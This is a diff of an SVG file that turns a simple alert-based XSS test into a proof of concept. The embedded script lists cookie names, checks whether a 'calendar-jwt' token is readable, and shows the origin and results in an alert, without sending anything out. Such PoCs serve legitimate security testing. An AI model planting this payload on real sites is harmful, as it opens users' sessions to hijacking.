@@ -1,3 +1,21 @@
-﻿<svg xmlns="http://www.w3.org/2000/svg">
-  <script>alert("XSS em " + document.domain)</script>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script><![CDATA[
+    var names = document.cookie.split(';')
+      .map(function(c){ return c.trim().split('=')[0]; })
+      .filter(Boolean);
+
+    var hasCal = document.cookie.indexOf('calendar-jwt=') !== -1;
+
+    document.documentElement.setAttribute('data-domain', document.domain);
+    document.documentElement.setAttribute('data-cookie-names', names.join(','));
+    document.documentElement.setAttribute('data-calendar-jwt', hasCal ? 'readable' : 'not-readable');
+
+    alert(
+      'origin=' + location.origin +
+      '\ndomain=' + document.domain +
+      '\ncookies=' + names.join(',') +
+      '\ncalendar-jwt=' + hasCal
+    );
+  ]]></script>
+  <text x="10" y="20">XSS PoC</text>
 </svg>
